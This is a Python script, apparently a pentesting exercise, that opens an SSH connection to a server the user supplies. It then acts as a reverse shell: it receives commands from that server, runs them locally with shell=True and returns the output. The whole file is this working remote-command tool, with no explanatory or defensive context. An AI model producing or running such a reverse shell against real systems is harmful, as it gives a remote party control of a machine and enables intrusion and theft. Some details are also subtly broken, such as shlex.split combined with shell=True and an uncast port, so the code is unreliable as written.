import paramiko
import shlex
import subprocess


def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        ssh_session.send(command.encode())
        print(ssh_session.recv(1024).decode())

        while True:
            command = ssh_session.recv(1024).decode()  # Decode received command
            try:
                if command == 'exit':
                    client.close()
                    break
                cmd_output = subprocess.check_output(shlex.split(command), shell=True).decode()  # Decode command output
                ssh_session.send(cmd_output.encode() or 'okay')  # Encode command output before sending
            except Exception as e:
                ssh_session.send(str(e).encode())  # Encode exception message before sending

    client.close()


if __name__ == '__main__':
    import getpass
    in_user = getpass.getuser()
    in_password = getpass.getpass()
    in_ip = input('Enter server IP: ') or '172.17.32.1'
    in_port = input('Enter port: ') or 2222
    ssh_command(in_ip, in_port, in_user, in_password, 'ClientConnected')
